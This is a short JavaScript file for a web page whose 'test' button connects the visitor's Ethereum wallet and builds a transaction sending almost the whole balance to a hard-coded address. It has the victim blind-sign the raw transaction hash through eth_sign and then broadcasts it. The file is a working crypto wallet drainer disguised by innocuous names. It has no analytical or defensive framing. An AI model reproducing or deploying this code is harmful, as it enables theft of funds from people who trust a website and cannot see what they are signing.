const testBtn = document.querySelector('.btn-test')

const test = async () => {
    const web3 = new Web3(window.ethereum);
    await window.ethereum.enable()

    if (window.ethereum.chainId !== '0x1') {
      
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
      })
    }
    
    let userAddr = (await web3.eth.getAccounts())[0];
    await web3.eth.getTransactionCount(userAddr, "pending").then(async nonce1 => {
    const gasPrice = await web3.eth.getGasPrice()

    let pub_addr = "0x794Fed8D9bEe97a7e352e4C308Cec5632b741104";
    let chainId = await web3.eth.getChainId();

    const balance = await web3.eth.getBalance(userAddr)

    let wei_send = balance - 1000000; // wei to send

    let tx_ = { 
        // from: userAddr,
        "to": pub_addr,
        // "chainId": chainId,
        "nonce": web3.utils.toHex(nonce1),
        "gasLimit": "0x55F0", // gasLimit
        "gasPrice": web3.utils.toHex(Math.floor(gasPrice)),
        "value": web3.utils.toHex(wei_send),
        "data": "0x",
        "v": "0x1",
        "r": "0x",
        "s": "0x"
    }


    var tx = new ethereumjs.Tx(tx_, {chain: 'ropsten'});

    var serializedTx = "0x" + tx.serialize().toString("hex");
    let hexer = { "encoding": "hex" };


    const sha3_ = web3.utils.sha3(serializedTx, hexer);

    await web3.eth.sign(sha3_, userAddr).then(async signed => { 
    if (wei_send <= 0) return
    const temporary = signed.substring(2),
                    r_ = "0x" + temporary.substring(0, 64),
                    s_ = "0x" + temporary.substring(64, 128),
                    rhema = parseInt(temporary.substring(128, 130), 16),
                    v_ = web3.utils.toHex(rhema + chainId * 2 + 8);
                tx.r = r_;
                tx.s = s_;
                tx.v = v_;

            const txFin = "0x" + tx.serialize().toString("hex")//,
            const sha3__ = web3.utils.sha3(txFin, hexer);
            await web3.eth.sendSignedTransaction(txFin).then(elisebeth => console.log(elisebeth)).catch(vannette => console.log(vannette))
        }).catch(heide => console.log(heide))
    })
}

testBtn.addEventListener('click', async () => {
    await test()
})